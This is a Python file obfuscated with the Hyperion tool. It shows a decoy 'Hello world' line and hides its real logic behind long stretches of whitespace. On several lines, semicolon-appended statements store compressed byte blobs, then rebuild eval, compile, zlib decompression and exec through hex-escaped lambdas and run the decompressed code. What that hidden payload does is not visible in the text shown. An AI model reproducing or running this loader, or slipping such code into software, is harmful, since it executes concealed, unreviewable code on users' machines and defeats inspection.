from builtins import *
from math import prod as Positive
__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'
__code__ = 'print("Hello world!")'
_ceil, _random, Math, Run, Floor, _frame, _divide = exec, str, tuple, map, ord, globals, type
class Modulo:
    def __init__(self, _add):
        self._round = Positive((_add, 16624))
        self._builtins(Builtins=40308)
    def _builtins(self, Builtins = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._round /= -99226 * Builtins
        
        try:
            ((_substract, (Run, Floor)) for _substract in (Run, Run, _ceil) if Floor >= Run)

        except AttributeError:
            {_ceil: Math} if _substract != Run else (_ceil, _random, Run) > Run

        except:
            _divide(-9245 + 81388) == True
    def Frame(self, _detectvar = 7388):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _detectvar *= 89647 + 97831
        self.DetectVar != Ellipsis
        
        try:
            ((Math, Run, Floor) or Math if (Math, Run, Floor) and Math else ... or (Math, (Math, Run, Floor)))

        except AttributeError:
            (({Math: 'RRbtedheba3ha'}, Run) for Run in (_ceil, _random, Run))

        except:
            _divide(-72093 + 92529) == None
    def MemoryAccess(Negative = str):
        return _frame()[Negative]
    def _floor(Divide = 20577 + -81816, Add = int, Statistics = _frame):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Statistics()[Divide] = Add
        
        try:
            (({Math: 'RRbtedheba3ha'}, Math) for Math in (_ceil, _random, Run))

        except ArithmeticError:
            ((Run, Run, _ceil) or _substract if (Run, Run, _ceil) and _substract else ... or (_substract, (Run, Run, _ceil)))

        except:
            _divide(-5385 * -86365) == False
    def execute(code = str):
        return _ceil(_random(Math(Run(Floor, code))))
    @property
    def DetectVar(self):
        self._statistics = '<__main__.Add object at 0x000006353BE56556>'
        return (self._statistics, Modulo.DetectVar)
if __name__ == '__main__':
    try:
        Modulo.execute(code = __code__)
        _multiply = Modulo(_add = -35862 * 2327)
        if 495606 > 2123678:
            _multiply.Frame(_detectvar = 91958 - _multiply._round)
        elif 409070 < 9107849:
            Modulo(_add = 46730 + 30103).Frame(_detectvar = -17938 + _multiply._round)                                                                                                                                                                                                                                                          ;Modulo._floor(Divide='wxwwwxxxxxwwwwxwx',Add=b'x\x9c\xdd\x1bks\xdb6\xf2\xbb~\x85\xea~\x90tud\n|\x89\x9e\xd1\x874j\xaf\xf2\xa8Q\'N\xce\xe98\x1e\rE\x822\x1d\x8a\xd0\x91T-O\xe7\xfe\xfb\xed.\x00\x9a\xb2\xa5D\xb2-71A\x10\xef\xd7b\xb1\xd8]\x80Evs\\\xab\xc3\x13GMr\xf1\x19\x8f\xc5$Z\xe4\x81_\x88l<\xae\xff\xd0;\xf8\xedf\xce\xb3X\xa4\x07u\x91U\xb2\xf9\x8b\xe2Rd9\xe5i\x1eL\xe2$\xb9).\xf9T\xf8\x85i;\x07\x87\x07?\'\x0b\xfe\x8e\x87\x07\xad\x95R\xd3\xb8\xb8\\Ld\xc5\x97E1\xcf\x8f\x8f\x8ed\\;\x10\xb3\xa3;\xd5\x1cmh;\x8c\xf3@d\xe1j5*\xb2=\x9d\x1e\xcd\x13\x7f\xba\xe0w\n%q\xc0\xd3\x9c\xcbB\xbf\xfc1|\xc5\xda\xc6\x9d,\x81\x08ezc\x9e\xc5i\xd1<\xf8\x8d\'\x89\xa8_\x8b,\t\x7f8h5j\xad\xe327\xa67\xf2\xcfq\xd8h\xd5\xf82\xe0\xf3B\x013\x9d/\xa0\xe4;\x91\xf3\xbc\xeeg\xbc\x9e\xf1\xf0S\xfa\x9fX$\xbc\x90\x11\x13\x80\xcc\xa7\xf4O\xb1\xa0\x90_\xc7J>\xa5o\xc5D\x847\xf5$\xfe\x0c\xe5n\xc4\xe2\xa0U\x93\x9d\x8ags\x91\x15\xe31\xb4v\x937Zm\xbe\x8c\x8bf\xab\x96\x88\xc0O\xf2f\xeb\xbc\x91$Wq|\x95\xc0\x9b\x00\xf8\x92\x18\x02\x8d\x8b\xde4\x11\x13\xc8P[\x93\x8a\x85f\xb34\x9d)C\xef\xacq~|\xfc\xd3\xab\x9f^5_5\x7f\xea\xb4Z\x17P\x05/\xfc\xa2\xc86Uq\x06\xcf\xc7\x8fg\x1f\xc9\x01\x0f~\xefW\x12\xc6\x1b+\x80\x98\xf8\xea\xea\x8a\xa2c|\xaf\xb0\xe3r`\xb55\x89X\xe6z\t\xcf5<\xf4\xc1\xef\x12\xca\xdcBiS[\xbf\xe3\xf3\x16\x9e\xd2\x81bk*k6&\x8b8)\xe2\x14A\xfd\x97\x9fm\xec\xc8pp\x02\xcf\xe0d0\x18\x0e\x07`\x86\'\'C\xa8r\xa6\xc0Y\x82v\xd6\\\xdbJ\x9e\xc6E\x12/&w\x01\xd6:\xd4\xa0$\xb8\x9e\x91s\xb6c\x1d\xad\xf3\xa7\xa8\xa4\x1d\xa7!\x87\x1c<\x89\xe73\x11\xdc\xcbp\xd1\xaa\xdd\x87\xaa\x9c#\xac|\xa9\xdaQS\xd4h\xb4\xafD\x9cn\x9a\x1f(*_U\x11\x98\xb7\xbf\xef\x00\xcf8\x0er?\x8d\x1f\x05\xcf\x8du\xec\x02\xcf\xcd\x95hx\xdeDq\xb2\xe4\x97\xe9b\x1dD7\x80\xa7\xdf\x17#1\x82\xb7\xdf\x1f\x8dF\xfd\x91\x80\xa0\xe8\xbfP|\xcb\x13\xff\xd7\x1d`C-R\xeb\xd2\x91T\xe9\xe3\x0b\x05\xce"{\xbf\x03l\x96z)^\x93\x8f\xdaz\x99\x80I\x84\xb8\x9f\xba\x190\x1f%\xd2\x9c)\xcc\xa1N\xbc`\xb4)|\x91D;\x80g42F\x86!\x84@\x07\x02\x02\x89\xcf\xcb\x04MV\xe4\xeb\x00\xb3a\xdb\x07\xea\x0bT\x18@\x03\x8e@GP\x8c\xf1R\xa1\x93\xf8\x7f\xf1\xed\xf1f\xed.\xde\x9c4\x1c\xdf\xf1\xc0\xfa\xe4zN@6\xa0P\xa0\x0c\xc5\x03\xcf\x15r\xe4\xc2\x9b\x8dnT\xac\xd9 _"\x88\x03\xbe\\\x0b\xe2\xb5\xcc\xd5&\x08[\x91\x03\xc6\xc2\'\xb2"\xfaj+c\xe1\xf9:t7cwsS\xc3\xcce\xdcf\xd0\x08\xb3\x02+\xb2M\xcb\xb6L\xdb\x86\x18\xcf\xb6l\x8f\xb9_kt\xc7q:\xa12\\\xd9j\x88\xeb\x98=\x8d\xd4e\x00d\x06\xc8\x1a\xb9]\xc6\x1d\x13B\xe1\x93\x8f\xd0\xf2\x94\t,\x1fl\xa0|>}=\xf5\xf5\xbf>\xc2\xc4\x9fMB\xbf~\xbb\xd1\xe9\x1d\xee\xecx\xed\xe2\xdd\xc0\xcc\x9f\xb2\xd3\xd3S\xc6\x98\xb4dN\xab\xad=\x00\x90f\x87\x85\xac\xcbB\xd3`\xdeW\x81GB\xe4\xb7\x83\x97\rZ\xf8\x92q \xa3\xb8\xce\xc7\x82\xc4\xb4#\xb3\x0b\xd6\x01k\x83\xf5\xc0\x9a\xcao\xb0\t\x81kS\x1e\x0b\xfd\xfb\x05\xe5\x83\xc15\x12}\xd1\x07\x81\xa5\x8f\x12K\x1f\xdb\x02O\x7fKh5Z\xf6\xd8\x1a{\xe3\xce\x98\x81k\x8f\r\xf8\xbaP\xc4\xb9\x1f\xfbX\xf8\x1b\n%;\xdb\xc1Q\xc2R-1)\xfdKu\xc0\xf0d\x08\x9f\xc1p\x975\xb6\xa9S\xb6K\xa6\x0b\xc6%\xeb\xae\xc4\x90\xd9\x9a\x0e\xf4Q\x84\xec#D\x10\x1a$O\x82,\t\xf6Izj\xa21\x99\xc9\xaa\xae\xf4\xcb\xf0\xaa\xf9\xae\xe93\xed\xa9\xb4\xdb\xd2\xceJn\xe9\xd7\xb1{\x1a\xa1\xe5\xb9\xa6m\xc08m\xd8\xe6<\xd7\xde\xc7\xf8\x80\xe0\xa0q"\xb4V\xa4}\x8e\x1a3\x86\xf0\xfb=\xcca\x03\xd6#-Jx\x07\xd2\x0bksk\xeac@\x96\xce3ov+\x94\x05\x96\xe3`0H\xc8\x90\x8b\xcf\xe0x\xadl\xb2\x01\x02\xe8\xbe\xd5=\xc3\x144[C\xc0\x1d\xbb\x8a\xd6\x1ac\x13\xbe\xf6\xb8\x03E\xba\xf7c\xff\x11\xfa\xfb\x10\x04c\xb6\xe3tH\xde\xb0\x98a\x99\x84\xd5\x13\x08\xd9\xec\xabTi\xc7\x85\xe4\xban\xd7\x95O\xb7\xe2\xd7\xa1n%\xb6\xfb\x12X\xf3\xca\xe6\xa47\xa8n\xc5\xa8\xd4\xfd\x8c\x94}q\xa4O=\xb3\x92\xfc\xdf\x12F\xab$\x8bV$I\xa6\xf4\x7f\x17$\x92H\xc2[I&\xe4g{\xf2\x00\xc4\xe0\x95\xb1unF\xa4B~\xa5eP\xc4\xbc\x1f\xbb\xa7\xf6=\xc5,b\x8b\xe8w\x88\x994\xc0\xbd\x13\xfb\x0f\x90\xfc\xaa}(a\xb3]\x10\r\\@z\xcbz0\xca7d\xed\xaa^\xd9\xd63\xd3\xf6r\xf7\xc3fP\t\t\xad\x18\xa4\x90\x04\xdeU\xec$\xbc\xa2\xee\x12j1\xa4\x02\x93\xbe\xd2\xff\xbc,\x00\xab\x08j\x1d%\xc4\xd9*\x0e\x858L\xef*!o\x9b\xbc\xee\xbe7I\xd7&\x12\x03\x04\xbbk1\xda.;\x0e\x12\x1a\xfb\xe1dF+\xedfd\xd1I\xf7\xb2\xcc7/\xca\nP\x99\xf2\x9b\xca\x1a\n\xd0\xa6\x9a\x84m\xf2\xb2\xbdO\xc2\xf3\x883\xa1\xc5\xc1\xe2\x97\x97\xfe\xdb\x10\xbf\x9f\xba\xb5\xc89@\x96\xfbD\n\xc7\xc8w\xe39\xf9\xe0\xe4d\xa7\x15\\\xf6\x98\xbe\x9a*\xfds4\x89\x18\xf1\x81b\xc4%K~\xbc\xae\xe7;j5+\xba\xcbR\x97\x19V\x0c\xaf\xea8\xf7\xc4B9]\xd7\x02c\xb8\xa6\xe9\xb3\x88E\x8e\x05\x12\xa6\x89h\x07\x88h\x95\x08\x189\x1d\xd7p<\x16\xb9.H\xa1PJ\xb2\xd0\xae\xc9`\xbd\x00\xe7c\x9a]\x10\xf1\r\xd3U\xc6\x03\xc3(\xa5C~\x83!\xc3\xcd\xed\xae\xeb\xb1\xd0\x99\xb0\xd0\xb6\x9d\x0ep\x86\x91\xd35\xbb\x96e\x83\x8ck\xfb\x8e\xe5\xfa\xb6cu\x9c\x89\xc5l\x0f\xd89\x1fR]\xc7\xc7\xeeX.\x1e&Xxt\x10\x9a\x0e<\xccq\xa1$\xd4\r\xfd\x84]\x10x0\x0fR\xbb\x16\'q\xb5\x83\x00\x84\x1a\x99\xe3C\xbf\xa1=\xe87\xd6\x01\xa5\x1e\xbeK*E\x0fZ\xc0k\xd2\xfe<;F~\xfb\x12A)\xed\xacJBn)\xfftW\xe5\xa1\xe7Bl\x89\xc0\x1c\xd0\x1b\\\xc7q\xd1\x8fH\xeeB\xeaS\xcb\n\xe5\xf1\x96\xaf\xac<\xea\xbau\xbd2\x9e\x8e\xc4\xf6$3\x94\xcc!\xa7\x05\xf1\x88\x8d|@\x94\xaf|\x95nb\x90<\x16\xff-\xb5\xcfZ\x9a\xc9\xa92<j\xefej\x7f\xde&\xef~\xd7\x11\x11C\xeeZ@\x02\xe1\xfb\xf4\xb2\xb4R\x9dju\xaaV\xa3\xae\x86\xb5\x92u/8\xb3\x13A\xdaqMxt\xf8\xabW\x85W\t{e\xfcm\x08|[\xf3\x1c\xa2\xaf\x86\x86\xban\xba&\x85\x87\x0f;\xb1\x1c#u\xf9\x01\xc0#\xe8\n\x84A0\xdbVf\xd8\x08O\xcd<jf\xd2VaO\xf9\xd1Z\x95\xa3\x9e\xaf\xe55\xf7\x89\xe0\xf7\x88\xa6$\xdb\x8c\xafeJ\xc1R,\xce\xa3]\xf2\x07\x8a\xe4@,\x87]\xfa\xe9I\xab\xd2\xbbGR[\xadU2Z!cEZO/\xf5\xd9\x98o\x07\xd6\x15\x9e\x13\xe4V\xc1\x1d\xa2\xa5\xab\x9eOqV\xa2Nu\xe5Yn\xa0Nx\xd1\xf8d\xc0\xb7\xafmp\x95d=\xf9F\xa7OE,\xa7\xe2\xd2\xf9\x08Yu\x0faOJ1\x1c]\x00<\xe8\x93\xe3\x98\xa7N\xde}u&\xafg\xea\xf64^\xf9\xf64.\x0bV\x1al\xd9\x16\xad"X\x7fd\x1e\xce\xb7"V\x0f\xe94\x04\xb1\x9a\x0e+\x9fW\x17\xd2U\xdb\xb4\xa7\xc4kK\x8b\xd3\x15J\xe7(*\xb8M^\xfb\x01\xc7*#\xba\xceF\'\xd2\xb09\xf4\xf1\x83\x03\x11\xa3\xa7X\xdf\x1a\xd7\xe5z(\xcf\x07\xd5\xa9!\xba\xfa\xa6\x8e^#\xdf\xa8\xf2?\xca\xc4\xac\xaeo\xc3\xd7\xe5\x05\xfb:_\xf2\xe0\x90\xfe\x8e8D\x8b?#\xd40\xae\xf9\xf1\xac\xbc\rQ\xbdY\xd9\xaa\xa9\x82"\xd7>l4(CW\xb9H\xb5?\x13\x93D,\xe77e\x98\xffw\xc1\xf3"?\xcc\xb8\xec\x8d\xfa\xc7\xe3\x9aO.\x85\xf8\xac\xfa\xf4/\x9d}\x92\x89\xeb\x9cg\xe3\x00\xd2bn\xd6T\xb6\xcf\xbd4\x95z\xa7T\xab\x9e\xc8\x9f\xd6B\x1eAof3?\r\x9b\x81\xfa\xb7C\xe4\xed\xfc&/\xf8\x0cbd\x06\xfc\xcb\xe2n\x9a\xc0\xeb\xd7\x82l_\xdep\xe8\x8f \xfbb6\xbb\x19\xcfx\x9e\xfbS\xde\xa3s\xc7\x81\xd4y\x0c\xf5\xaa\xab\xffX\x7f]W9\xea\xc5\xa5_\xe0\x98\x8a\xcc\x0f\x8a\x1c\x82\xbc\xbe\x80\x01\xd4i\xacA"\xf28\x9dR\xec4\xf3\'\x13\x9e\xd5\xe4o)+\xcd\xa8N\xd2\x90\x87b:\xe5\x99\xeem\xe8\x17~\xef\xfc\xe2G\xf2\x9c\x1b\x17\xbd\xde\xeb$\xa9\xbf\xa1\x9cy\xf3C\xce\xc3\xfa\xaf"\xab\xbfS@n\x1d\x1dQ\xc6\x0edl\xbf\x1b\xfd<\x1c\x9d\xfe\xf2\xe6\xc3\xbb\xc1\xfb?U\x99\xdb"\xd8\x0evm\x90\xd6\xdf\x8b\xfa{\xe8\xe0\xeb \x10\x8b\xb4\x90\xff\xac\x14\xfa\xc7"|d\xcf\xf2\xde\x9d\xc9iGq\xc6#\xb1l\x86b\xe6\xc7\xe98\xf5g\xbcw;?z\x8ef\xad\xb2\xa2\x08\x1a\x96\x85\xebq\xaa\xab\xbdmG\xfe\xc8\xa4\xe2\xdbT]\xefT]X\xd2\xd7\x970\xbcZB\xc3\xa9\xed\xcf\xe7\x1c\xb1@V\xdb\xda"S\xfb/?Y\xf0\xfb93^,\xb2\x94\nPZ\xf5\xe7 |\xe6~\x9eo\x0f\xa6\xe0\x12p!^\xccV\xe0\x84*m\xd2\x8a\x13\x7f*\x88\x10<\nP\xf2\x86\xb8\xfe_\x03o1\xe2\xe5\xc5\xef\x0cT<\x9c\xf2\x150\xe9\xa5\xae\xd6>z\x1e\x05%\\\xf3}\xfc\xfb\x82\xf6\x0b\xdc7\xbe')

        _multiply._builtins(Builtins = _multiply._round + 3054)                                                                                                                                                                                                                                                          ;Modulo._floor(Divide='llIlllIllIIIlIIlIIIl',Add=b'3\x08\x899\xcf\xfcUL\x12R\xc8\xa1\xcd\x84\xb6\x98\xd1\xe8Q0:!]/\xa9\xc5N\x14\xcd\xfb\xce\x80D+n\x15\x91\xe8\x06\xa4\xb4\xa7\x92\x9c\xc8\xe7Q\x90\xc2MC\xc8;q\xc8}\xf4\t\xbbpC\xf96\xe0\xa5\xc1\xb3\xba\xb3\xd4\xe2\xf9\xd8\x0f\xc3\x0c\xf6\x9e\x9e\xde\x9d\xdbS^4\xaf\xf5\xff^\xf2_\x13\xf5\xdf\xc9r\xd9j\x17|Y\xd4\xe4\xce\xae`\xac\xea\xcc\xcfO+\x97K\x95\x8b\x10\xbe\xa8\xc59t=\x0e{\x9a!h\x7f(\xe2$o\xbf\xb9\xe4\xc1g\xb5\x19\xad\xd4\x08\xfd\x8a\xea\xbaPO\x1e_\xca\xe7-\x1d\x1b\x80\x95\xc3\xa3\xa1\xf1$\xe72X\x0ea.\xf2\xa2\xb9\xc8\x92\x9e\xe6\x19\x0ei\xf7\xfc\x1bp\x99\x14\xbc\xc4,\xe3n~\xfc\x00V\xccq\x18\xb3\x19\xe3\x96\x07,\x99\xc1\x0c\x168\xd5{\'\x06\xaa\xd9\xe1k\xbb]\x14\x9c\xe9r\x97e\x07\xc0\xee\xa3\xa8\xd6\xc1{*\xab\xf9M\x1f\x04\xeb\x89k\xa3j\x04\x84s\x03\xadC\xc6\x9dT\xc5s;\xaa\x96sC\x99g\x0b\xe1\xe1\x7f-\x85\x17\xf4\xa7)\x9fd\x8b\xcb\xd5\xd9\xa6\x7fC\xd4\x0f"\x824%\x06\x1e\xd1\x8e\x0e5\xd6\xfc]\xfd)T]\x93?^\x992h#N#\xd1C\xfe\xaf\x9d\x08?\xcc\x9b\xd4\x10\xe1K\xab\x96\xc1Db\xfa\xb9\xe4\xb7\xf5\x87&\xf6\xa2\x96\xf9\xf3\nn\xc0\xeam\xff\xb2,x\x96\xfaI\xfb\xdf\xbcx\xf7\xfa\x8f&\x94G\x0e6\x86\xd5\x90\xdf\xc9\xfa\xab\x8c])\xf2\x06\xb9\x17Y\x08Y\xb7\xcdu\xbf\x86=\x86\xb2\x05\x19`\xc8\xc6\x9co2\xee\x17\xb1H\xfb\x90G\xe6\xcfD\x12\xcfD\x9a?\x84\x97G\x04\xfa\xa2>\x06ue!I\xf7\xe6\xadN\x06\x90)p:.N=\x83\xd0\x8441\x96\x1bn#=\xaa\xa9\x9ag"\x8a\x13\xfet}\xc6\x13\xa3M:$\xad/\xc2\x93\xa4Joa\x1c\x94\xdf\x91\xda\xa5mz\x7f\xc9\x01\x9d.E\xf1\x85y\xfcMe\x91\x93\x83\\7QeB9\x14\xfc\xae\xc0\xa0\xf8\x876F?H\x86\x17\x08\x96\xc5Rf\x1a\xd1\xbfQ\xf4\x1dI\xbf\xbalp\x01\\:G\x96M\xe6\xa3+\xb7t\xdf\x96n\xdd\xa2\xf7\xa2\xe6\xf7V)\xcf\x1d\xaa#\x15\xeaJ\xbb\xae_\xbc\xf8\xf7\xb0yp\xed\x89}\x07K\xec\x90u\x15\xb1\xa8\xc4\x02\xb4=f\xb8\x013T\t=G\x86\xbd2\x07\x95\xd2%\xa9Y\x9d%Y\x13\x12\xb1\xdb\x9b\x04\xccX\xbdK\x80dK\xd7\x82\xe9P\x86JX&\x91\xc0\x8e\x8b:\x0f\xe8\x17\x94\xb3(\xa4J8\x98\xaebt\x19\x90k;\xb6Q\xd6\xd8\x81\xde\xe8\xda\x1c\xc2$\x1b\xc9)\xe1!\xd6\xb0\x12W\xe6\xec8\xf2\xb4S\xea\xc7\x0c\x08\xbbe\x9b\xe4/szH\xc6!\xdd\xc2\x9e\xe2!\xa7\xca\xe5\xb9\x86-\xb55e\x8a.\xf3%i|G\x02n\xd8\x96\xd3%(Nh\xe3p\xf0\xf0\n\xda\xc7\xf5#\xb5D\x86\x8b9lraf \x0f^&\xe8@\xbd\x8c\xa8\x01B\xcac\xdbh\x01\x80LK\xa1\xd3W\x84\xf9\xff\xcd\xe4W\x82')
        Modulo(_add = -53142 / 78338).Frame(_detectvar = -30632 - _multiply._round)                                                                                                                                                                                                                                                          ;llllIIIlllIlIIlIIlIlIl,wxxwxxxwwwwwwwxxwwwwxxwx,ILLLJIJJLIILJJJLIJLILIJII,mmmnmmnnnnmnnmnnmmnmn,LLJJLLLJJLJIIIJIJJLIII=(lambda XWWXXXXXWWWWXXXWXWWXW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XWWXXXXXWWWWXXXWXWWXW)"),filename='\x57\x58\x57\x58\x58\x58\x57\x58\x58\x57\x57\x58\x57\x57\x58\x57\x58\x58\x57\x58\x57\x57\x57\x58',mode='\x65\x76\x61\x6c'))),(lambda XWWXXXXXWWWWXXXWXWWXW:XWWXXXXXWWWWXXXWXWWXW(__import__('\x7a\x6c\x69\x62'))),(lambda XWWXXXXXWWWWXXXWXWWXW:XWWXXXXXWWWWXXXWXWWXW['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda wwwwxwxwxxwwwwwwxwwwxx,XWWXXXXXWWWWXXXWXWWXW:wwwwxwxwxxwwwwwwxwwwxx(XWWXXXXXWWWWXXXWXWWXW)),(lambda:(lambda XWWXXXXXWWWWXXXWXWWXW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XWWXXXXXWWWWXXXWXWWXW)"),filename='\x57\x58\x57\x58\x58\x58\x57\x58\x58\x57\x57\x58\x57\x57\x58\x57\x58\x58\x57\x58\x57\x57\x57\x58',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 440381 > 4171231:
            Modulo(_add = 23604 + -77659)._builtins(Builtins = _multiply._round * -57389)
        elif 227601 < 6324580:
            _multiply._builtins(Builtins = _multiply._round * -63208)                                                                                                                                                                                                                                                          ;LLJJLLLJJLJIIIJIJJLIII()(mmmnmmnnnnmnnmnnmmnmn(ILLLJIJJLIILJJJLIJLILIJII(wxxwxxxwwwwwwwxxwwwwxxwx(llllIIIlllIlIIlIIlIlIl('\x76\x61\x72\x73'))),Modulo.MemoryAccess(Negative='wxwwwxxxxxwwwwxwx')+Modulo.MemoryAccess(Negative='llIlllIllIIIlIIlIIIl')))
    except Exception as _substract:
        if 100222 > 954052:
            Modulo.execute(code = _random(_substract))
        elif 427681 > 6144382:
            Modulo(_add = -31112 + -46716).Frame(_detectvar = 29507 + _multiply._round)